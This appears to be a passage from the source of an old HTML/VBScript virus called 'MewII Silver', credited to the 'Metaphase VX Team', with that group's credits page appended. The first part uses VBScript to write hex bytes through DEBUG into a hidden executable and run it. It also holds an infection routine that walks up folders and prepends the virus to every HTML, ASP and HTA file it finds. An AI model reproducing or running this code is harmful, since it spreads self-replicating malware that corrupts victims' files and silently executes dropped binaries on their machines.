  DropMewJoke.WriteLine "e 0670 eb 10 90 90 90 90 90 90 8a 06 46 88 07 47 01 db "
  DropMewJoke.WriteLine "e 0680 75 07 8b 1e 83 ee fc 11 db 72 ed b8 01 00 00 00 "
  DropMewJoke.WriteLine "e 0690 01 db 75 07 8b 1e 83 ee fc 11 db 11 c0 01 db 73 "
  DropMewJoke.WriteLine "e 06a0 ef 75 09 8b 1e 83 ee fc 11 db 73 e4 31 c9 83 e8 "
  DropMewJoke.WriteLine "e 06b0 03 72 0d c1 e0 08 8a 06 46 83 f0 ff 74 74 89 c5 "
  DropMewJoke.WriteLine "e 06c0 01 db 75 07 8b 1e 83 ee fc 11 db 11 c9 01 db 75 "
  DropMewJoke.WriteLine "e 06d0 07 8b 1e 83 ee fc 11 db 11 c9 75 20 41 01 db 75 "
  DropMewJoke.WriteLine "e 06e0 07 8b 1e 83 ee fc 11 db 11 c9 01 db 73 ef 75 09 "
  DropMewJoke.WriteLine "e 06f0 8b 1e 83 ee fc 11 db 73 e4 83 c1 02 81 fd 00 f3 "
  DropMewJoke.WriteLine "e 0700 ff ff 83 d1 01 8d 14 2f 83 fd fc 76 0f 8a 02 42 "
  DropMewJoke.WriteLine "e 0710 88 07 47 49 75 f7 e9 63 ff ff ff 90 8b 02 83 c2 "
  DropMewJoke.WriteLine "e 0720 04 89 07 83 c7 04 83 e9 04 77 f1 01 cf e9 4c ff "
  DropMewJoke.WriteLine "e 0730 ff ff 5e 89 f7 b9 01 00 00 00 8a 07 47 2c e8 3c "
  DropMewJoke.WriteLine "e 0740 01 77 f7 80 3f 00 75 f2 8b 07 8a 5f 04 66 c1 e8 "
  DropMewJoke.WriteLine "e 0750 08 c1 c0 10 86 c4 29 f8 80 eb e8 01 f0 89 07 83 "
  DropMewJoke.WriteLine "e 0760 c7 05 89 d8 e2 d9 8d be 00 40 00 00 8b 07 09 c0 "
  DropMewJoke.WriteLine "e 0770 74 3c 8b 5f 04 8d 84 30 00 60 00 00 01 f3 50 83 "
  DropMewJoke.WriteLine "e 0780 c7 08 ff 96 3c 60 00 00 95 8a 07 47 08 c0 74 dc "
  DropMewJoke.WriteLine "e 0790 89 f9 57 48 f2 ae 55 ff 96 40 60 00 00 09 c0 74 "
  DropMewJoke.WriteLine "e 07a0 07 89 03 83 c3 04 eb e1 ff 96 44 60 00 00 61 e9 "
  DropMewJoke.WriteLine "e 07b0 4c ad ff ff 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 07c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 07d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 07e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 07f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0900 00 00 00 00 00 00 00 00 00 00 00 00 54 70 00 00 "
  DropMewJoke.WriteLine "e 0910 3c 70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0920 61 70 00 00 4c 70 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0930 00 00 00 00 00 00 00 00 00 00 00 00 6c 70 00 00 "
  DropMewJoke.WriteLine "e 0940 7a 70 00 00 8a 70 00 00 00 00 00 00 98 70 00 00 "
  DropMewJoke.WriteLine "e 0950 00 00 00 00 4b 45 52 4e 45 4c 33 32 2e 44 4c 4c "
  DropMewJoke.WriteLine "e 0960 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 4c 6f "
  DropMewJoke.WriteLine "e 0970 61 64 4c 69 62 72 61 72 79 41 00 00 47 65 74 50 "
  DropMewJoke.WriteLine "e 0980 72 6f 63 41 64 64 72 65 73 73 00 00 45 78 69 74 "
  DropMewJoke.WriteLine "e 0990 50 72 6f 63 65 73 73 00 00 00 4d 65 73 73 61 67 "
  DropMewJoke.WriteLine "e 09a0 65 42 6f 78 41 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0b90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ba0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0bb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0bc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0c90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ca0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0cb0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0cc0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0cd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0ce0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "e 0cf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
  DropMewJoke.WriteLine "RCX"
  DropMewJoke.WriteLine "0c00"
  DropMewJoke.WriteLine "W"
  DropMewJoke.WriteLine "Q"
  WshShell.Run("debug < c:\Windows\pokemon2.dll > nul"), VbHide
  WshShell.Run("c:\Windows\MewII.exe")
End If


Sub GetFolder(InfPath)
On Error Resume Next
If FSO.FolderExists(InfPath) then
   Do
   Set FolderObj = FSO.GetFolder(InfPath)
   InfPath = FSO.GetParentFolderName(InfPath)
   Set FO = FolderObj.Files
   For each NewFile in FO
   ExtName = Lcase(FSO.GetExtensionName(NewFile.Name))
   If ExtName = "htt" Or ExtName = "asp" Or ExtName = "htm" Or ExtName = "hta" _
 Or ExtName = "htx" Or ExtName = "html" Then
   Set MyMewII = FSO.GetFile(NewFile.path)
   Set MewII = MyMewII.OpenAsTextStream(1)
      If MewII.readline <> "<!--MewII Silver-->" then
      MewII.Close()
      InfectFile NewFile.path
      else
      MewII.Close()
      End if
   End If
   Next
   Loop While FolderObj.IsRootFolder = False
End If
End Sub

Sub InfectFile(InfectFileName)
Set MyMewII = FSO.GetFile(InfectFileName)
Set MewII = MyMewII.OpenAsTextStream(1)
FileContents = MewII.ReadAll
MewII.close
Set MyMewII = FSO.GetFile(InfectFileName)
Set MewII = MyMewII.OpenAsTextStream(2)
MewII.Write("<!--MewII Silver-->" + Chr(13) + Chr(10))
MewII.Write "<html><body>" + Chr(13) + Chr(10)
MewII.WriteLine(TRange.htmlText)
MewII.WriteLine "</body></html>"
MewII.WriteLine(FileContents)
MewII.close
End Sub
-->
</SCRIPT>
</BODY>
</HTML>

<HTML>
<HEAD>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
<TITLE>Metaphase VX Team</TITLE>
<STYLE TYPE="text/css">
.namelist {
	font-family : Times New Roman;
	color		: #ffffe0;
	font-size	: 18;
};
.thx {
	color		: #ffffe0;
	font-size	: 24;
	text-align	: center;
}
</STYLE>

<SCRIPT LANGUAGE=JavaScript>
var names = new Array (
'Knowdeth','Knowdeth',
'Sinixstar','Sinixstar',
'Demonphreak_','Demonphreak_',
'Sblip','Sblip',
'Raven','Raven',
'nucleii','nucleii',
'jackie','jackie',
'Evul','Evul',
'MetalKid','MetalKid',
'VxFaerie','VxFaerie',
'Lys Kovick','Lys Kovick',
'','',
'','',
'','',
'','',
'','',
'Specal Thanks To All The Beta Testers','BETA',
'and many many more...','',
'<BR><BR><BR>Welcome To<BR>A Member Of<BR>The<BR>HTML Pokemon<BR>Family<BR>By -KD-<BR>Metaphase <BR>&<BR> NoMercy<BR><BR>2000<BR>','thx0'
);

var namesIndex = 0;
var namesIndexOrg;

var pics = new Array (
	'c_place.jpg',	'1',
	'bld27.jpg',	'2',
	'brick.jpg',	'1',
	'welcome.jpg',	'2',
	'bld1678.jpg',	'1',
	'cd.jpg',		'2',
	'emp1.jpg',		'1',
	'emp3.jpg',		'2',
	'rtm1.jpg',		'1',
	'bus.jpg',		'2',
	'c_bike.jpg',	'3',
	'c_ftn1.jpg',	'1',
	'c_ftn3.jpg',	'2',
	'c_ftn4.jpg',	'1',
	'c_bird3.jpg',	'2',
	'c_bird2.jpg',	'3',
	'c_lake1.jpg',	'1',
	'c_lake2.jpg',	'2',
	'c_cafe.jpg',	'3',
	'c_recep.jpg',	'1',
	'c_sport.jpg',	'2',
	'hammer2.jpg',	'1',
	'piers.jpg',	'2',
	'kingdom.jpg',	'1',
	'needle.jpg',	'3',
	'sea-bld1.jpg',	'1',
	'sea-bld3.jpg',	'2',
	'train.jpg',	'1',
	'water2.jpg',	'3',
	'water1.jpg',	'1',
	'market.jpg',	'2'
);

var picsIndex = 0;

var creditsTimeout = 5500;
var picsTimeout = 2000;
var stopTimeout = 5000;

var nameCount = 21;
var nameX = document.all.name1;
var nameP = document.all.name2;

function showNames() {
	var nString = "";
	var i, j = names.length;
	var bEof = false;

	namesIndexOrg = -1;
	if (namefind.innerText != "") {
		for (i = 1; i < j; i += 2) {
			if (names[i] == namefind.innerText) {
				namesIndexOrg = namesIndex;
				namesIndex = i - 1;
				break;
			}
		}
	}

	for (i = 0; i < nameCount && namesIndex < j; 
				i++, namesIndex += 2) {
		if (names[namesIndex + 1] == 'thx0') {
			if (i)
				break;
			else
				bEof = true;
		}
		nString = nString + names[namesIndex] + "<BR>";
	}

	if (nameX == document.all.name2) {
		nameX = document.all.name1;
		nameP = document.all.name2;
	} else {
		nameX = document.all.name2;
		nameP = document.all.name1;
	}

	ShowHideObj(nameP, 0, 1);
	if (bEof)
		nameX = document.all.thxtext;
	nameX.innerHTML = nString;
	ShowHideObj(nameX, 1, 1);

	// restore the original index, if name jumped
	if (namesIndexOrg != -1) {
		namesIndex = namesIndexOrg;
		namefind.innerText = "";
	}		

	return (namesIndex < j);
};


function ShowHideObj(obj, bShowHide, bApply)
{
	var vis;

	vis = bShowHide == 1 ? "visible" : "hidden";

	if (screen.colorDepth >= 24)
		obj.style.visibility = vis;
	else {
		if (bApply == 1)
			obj.filters(0).apply();
		obj.style.visibility = vis;
		obj.filters(0).play();
	}
}

var imgX = document.all.img1;
var imgP = document.all.img2;
var prevImgType = '2';

function ShowPic() 
{
	switch (pics[picsIndex + 1]) {
	case '1':
		imgX = document.all.img1;
		break;
	case '2':
		imgX = document.all.img2;
		break;
	case '3':
		imgX = document.all.img3;
		break;
	}
	
	switch (prevImgType) {
	case '1':
		imgP = document.all.img1;
		break;
	case '2':
		imgP = document.all.img2;
		break;
	case '3':
		imgP = document.all.img3;
		break;
	}
	
	if (pics[picsIndex + 1] == '3') {
		ShowHideObj(frmLandscape, 0, 1);
		ShowHideObj(frmPortrait, 1, 1);
	}
	if (prevImgType == '3') {
		ShowHideObj(frmPortrait, 0, 1);
		ShowHideObj(frmLandscape, 1, 0);
	}

	prevImgType = pics[picsIndex + 1];
	
	ShowHideObj(imgP, 0, 1);
	imgX.innerHTML = "<IMG SRC=res://membg.dll/" + pics[picsIndex] + ">";
	ShowHideObj(imgX, 1, 1);
		
	picsIndex += 2;

	if (picsIndex >= pics.length)
		picsIndex = 0;
}


var bFullStop = false;

function credits()
{
	if (initxt.innerHTML != '') {
		initxt.innerHTML = '';
		ShowHideObj(initxt, 0, 1);
	}

	if (showNames())
		window.tm = setTimeout('credits();', creditsTimeout);
	else 
		window.tm = setTimeout('StopShow();', stopTimeout);
}


function StopShow()
{
	bFullStop = true;
	window.tm = setTimeout('closeProc();', 1);
}


function ShowImages() 
{
	if (frmLandscape.style.visibility == "hidden") 
		ShowHideObj(frmLandscape, 1, 1);

	ShowPic();

	if (bFullStop == false || (picsIndex < 1 || picsIndex > 4))
		window.tm = setTimeout('ShowImages();', picsTimeout);
}


function ShowNameImg()
{
	ShowHideObj(imgBkg, 1, 1);
	ShowHideObj(crd, 1, 1);

	document.all.initxt.innerHTML = 'The Metaphase VX Team<BR><BR>This list represents but a portion<BR>of the key people. through out the years.<BR><BR><BR><BR><BR><B>From Old School To New</B>'

	ShowHideObj(initxt, 1, 1);

	window.tm = setTimeout('ShowImages();', picsTimeout);
	window.tm = setTimeout('credits();', 8000);
}


function intro() 
{
	if (ShowNum())
		window.tm = setTimeout('intro();', 100);
	else {
		winnum.style.visibility = "hidden";
		ShowNameImg();
	}
}

var WinVerList = new Array (
	'&#139;&#139;',
	'&#140;&#139;',
	'&#140;&#141;',
	'&#142;&#141;',
	'&#142;&#143;',
	'&#144;&#143;',
	'&#144;&#145;',
	'&#146;&#145;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;',
	'&#137;&#136;',
	'&#148;&#147;'
);

var numIdx = 0;

function ShowNum() 
{
//useless section
};

</SCRIPT>

<script language=vbs>
dim strEmp : strEmp = ""
Sub keydownx()
	keyCode = window.event.keycode
	
	select case keyCode
	case 13
		namefind.innerText = strEmp
		strEmp = ""
	case 27
		strEmp = ""
	case else
		if (keyCode <= 255 AND keyCode >= 32) then
			strEmp = strEmp & chr(keyCode)
		end if
	end select
End sub

Sub closeProc()
	ON ERROR RESUME NEXT
End Sub
</script>

</HEAD>

<BODY BGCOLOR="#000000" ONLOAD="intro()" ONKEYDOWN="keydownx()">

<IMG id=imgBkg SRC="res://membg.dll/backgnd.gif" ALIGN="CENTER" VALIGN="CENTER" 
style="position:absolute; left:0; top:0; 
filter:revealTrans(duration=2.0,transition=7; z-index:1; visibility:hidden">

<DIV ID=name1 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=name2 class="namelist" ALIGN=LEFT VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=thxtext class="thx" VALIGN=TOP
style="position:absolute; left:83; top:22; z-index:90; width:180;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<DIV ID=initxt class="thx" VALIGN=TOP
style="position:absolute; left:78; top:22; z-index:90; width:240; font-size:18;
filter:blendTrans(duration=0.8); visibility:hidden">
</DIV>

<IMG id=frmLandscape SRC="res://membg.dll/frame0.jpg" 
style="position:absolute; left:330;top:49; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=frmPortrait SRC="res://membg.dll/frame1.jpg" 
style="position:absolute; left:339;top:38; z-index:90;
filter:blendTrans(duration=0.50); visibility:hidden">

<IMG id=logo SRC="res://membg.dll/logo.gif" 
style="position:absolute; left:278;top:370; z-index:90;
filter:blendTrans(duration=2.00); visibility:hidden">

<IMG id=crd SRC="res://membg.dll/credit.gif" 
style="position:absolute; left:22;top:22; z-index:90;
filter:revealTrans(duration=1.0,transition=5); visibility:hidden">

<DIV id=img1
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img2
style="position:absolute; left:344;top:65; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV id=img3
style="position:absolute; left:358;top:61; z-index:90;
filter:blendTrans(duration=1.00); visibility:hidden">
</DIV>

<DIV ID=namefind></DIV>	

<DIV id=winnum ALIGN="CENTER" style="position:absolute; left:20;top:100; 
font-family:wingdings; font-size:180; font-weight:bold; color:#0000ff;	
visibility=hidden"></DIV>

<OBJECT id="discwav" style = "visibility:hidden"
	classid="CLSID:05589FA1-C356-11CE-BF01-00AA0055595A">
	<PARAM NAME="ShowDisplay" VALUE="-1">
	<PARAM NAME="AutoStart" VALUE="1">
	<PARAM NAME="AutoRewind" VALUE="1">
	<PARAM NAME="PlayCount" VALUE="8">
	<PARAM NAME="FileName" VALUE="C:\WINDOWS\Application Data\Microsoft\WELCOME\welcom98.wav">

</OBJECT>
</BODY>
</HTML>